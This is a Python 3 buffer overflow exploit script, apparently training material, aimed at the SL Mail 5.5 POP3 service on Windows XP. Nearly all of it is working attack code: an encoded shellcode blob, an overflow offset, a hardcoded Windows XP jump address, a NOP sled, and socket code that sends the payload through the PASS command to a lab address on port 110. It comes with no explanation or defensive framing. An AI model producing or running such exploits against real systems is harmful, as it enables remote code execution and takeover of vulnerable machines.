# Buffer overflow script in Python 3 to SL Mail 5.5 in Win XP	#
# Guilherme Junqueira <contato@solyd.com.br>					#
# https://solyd.com.br 											#
#################################################################

import socket

# Shellcode
buf =  b""
buf += b"\xba\xb5\xf9\xb2\x1c\xda\xcf\xd9\x74\x24\xf4\x5d\x33"
buf += b"\xc9\xb1\x52\x31\x55\x12\x03\x55\x12\x83\x58\x05\x50"
buf += b"\xe9\x5e\x1e\x17\x12\x9e\xdf\x78\x9a\x7b\xee\xb8\xf8"
buf += b"\x08\x41\x09\x8a\x5c\x6e\xe2\xde\x74\xe5\x86\xf6\x7b"
buf += b"\x4e\x2c\x21\xb2\x4f\x1d\x11\xd5\xd3\x5c\x46\x35\xed"
buf += b"\xae\x9b\x34\x2a\xd2\x56\x64\xe3\x98\xc5\x98\x80\xd5"
buf += b"\xd5\x13\xda\xf8\x5d\xc0\xab\xfb\x4c\x57\xa7\xa5\x4e"
buf += b"\x56\x64\xde\xc6\x40\x69\xdb\x91\xfb\x59\x97\x23\x2d"
buf += b"\x90\x58\x8f\x10\x1c\xab\xd1\x55\x9b\x54\xa4\xaf\xdf"
buf += b"\xe9\xbf\x74\x9d\x35\x35\x6e\x05\xbd\xed\x4a\xb7\x12"
buf += b"\x6b\x19\xbb\xdf\xff\x45\xd8\xde\x2c\xfe\xe4\x6b\xd3"
buf += b"\xd0\x6c\x2f\xf0\xf4\x35\xeb\x99\xad\x93\x5a\xa5\xad"
buf += b"\x7b\x02\x03\xa6\x96\x57\x3e\xe5\xfe\x94\x73\x15\xff"
buf += b"\xb2\x04\x66\xcd\x1d\xbf\xe0\x7d\xd5\x19\xf7\x82\xcc"
buf += b"\xde\x67\x7d\xef\x1e\xae\xba\xbb\x4e\xd8\x6b\xc4\x04"
buf += b"\x18\x93\x11\x8a\x48\x3b\xca\x6b\x38\xfb\xba\x03\x52"
buf += b"\xf4\xe5\x34\x5d\xde\x8d\xdf\xa4\x89\xbb\x1f\xa6\x48"
buf += b"\xd4\x1d\xa6\x48\xbe\xab\x40\x26\xae\xfd\xdb\xdf\x57"
buf += b"\xa4\x97\x7e\x97\x72\xd2\x41\x13\x71\x23\x0f\xd4\xfc"
buf += b"\x37\xf8\x14\x4b\x65\xaf\x2b\x61\x01\x33\xb9\xee\xd1"
buf += b"\x3a\xa2\xb8\x86\x6b\x14\xb1\x42\x86\x0f\x6b\x70\x5b"
buf += b"\xc9\x54\x30\x80\x2a\x5a\xb9\x45\x16\x78\xa9\x93\x97"
buf += b"\xc4\x9d\x4b\xce\x92\x4b\x2a\xb8\x54\x25\xe4\x17\x3f"
buf += b"\xa1\x71\x54\x80\xb7\x7d\xb1\x76\x57\xcf\x6c\xcf\x68"
buf += b"\xe0\xf8\xc7\x11\x1c\x99\x28\xc8\xa4\xa9\x62\x50\x8c"
buf += b"\x21\x2b\x01\x8c\x2f\xcc\xfc\xd3\x49\x4f\xf4\xab\xad"
buf += b"\x4f\x7d\xa9\xea\xd7\x6e\xc3\x63\xb2\x90\x70\x83\x97"

buffer = b"A"*2607			# Offset
jump = b'\x20\x10\xb4\x7c'	# Ret / Jump at WIN XP
nop = b'\x90'*13			# Nops


print("Passando buffer com", len(buffer), "bytes")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.0.0.2', 110))							# Target
print(s.recv(1024))
s.send(b"USER\n")
print(s.recv(1024))
s.send(b"PASS" + buffer + jump + nop + buf + b"\n")
print(s.recv(1024))
s.send(b"QUIT\n")
print(s.recv(1024))
s.close()
